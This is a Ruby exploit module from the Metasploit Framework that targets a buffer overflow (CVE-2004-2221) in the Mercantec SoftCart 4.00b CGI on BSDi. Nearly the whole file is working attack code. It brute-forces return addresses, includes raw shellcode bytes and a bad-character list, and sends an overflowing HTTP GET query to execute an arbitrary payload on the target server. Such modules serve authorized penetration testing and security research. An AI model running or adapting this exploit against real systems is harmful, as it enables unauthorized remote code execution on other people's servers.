##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Brute
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Mercantec SoftCart CGI Overflow',
			'Description'    => %q{
				This is an exploit for an undisclosed buffer overflow
				in the SoftCart.exe CGI as shipped with Mercantec's shopping
				cart software.  It is possible to execute arbitrary code
				by passing a malformed CGI parameter in an HTTP GET
				request.  This issue is known to affect SoftCart version
				4.00b.
			},
			'Author'         => [ 'skape', 'trew' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
				    	[ 'CVE', '2004-2221'],
					[ 'OSVDB', '9011'],
					[ 'BID', '10926'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x09\x0a\x0b\x0c\x0d\x20\x27\x5c\x3c\x3e\x3b\x22\x60\x7e\x24\x5e\x2a\x26\x7c\x7b\x7d\x28\x29\x3f\x5d\x5b\x00",
					'MinNops'  => 16,
					'Prepend'  => "\x6a\x02\x58\x50\x9a\x00\x00\x00\x00\x07\x00\x85\xd2\x75\x0a\x31\xc0\x40\x9a\x00\x00\x00\x00\x07\x00",
					'PrependEncoder' => "\x83\xec\x7f",
				},
			'Platform'       => 'bsdi',
			'Targets'        => 
				[
					[ 
						'BSDi/4.3 Bruteforce',
						{
							'Bruteforce' =>
								{
									'Start' => { 'Ret' => 0xefbf3000 },
									'Stop'  => { 'Ret' => 0xefbffffc },
									'Step'  => 0
								}
						},
					],
				],
			'DisclosureDate' => 'Aug 19 2004',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [ false, "The target CGI URI", '/cgi-bin/SoftCart.exe' ])
			], self.class)
	end

	def brute_exploit(address)
		
		buffer =
			"MAA+scstoreB" +
			rand_text_alphanumeric(512) +
			[address['Ret']].pack('V') +
			"MSF!" +
			[address['Ret'] + payload.encoded.length].pack('V') +
			payload.encoded

		print_status("Trying #{"%.8x" % address['Ret']}...")
		res = send_request_raw({
			'uri'   => datastore['URI'],
			'query' => buffer
		}, 5)

		handler
	end

end
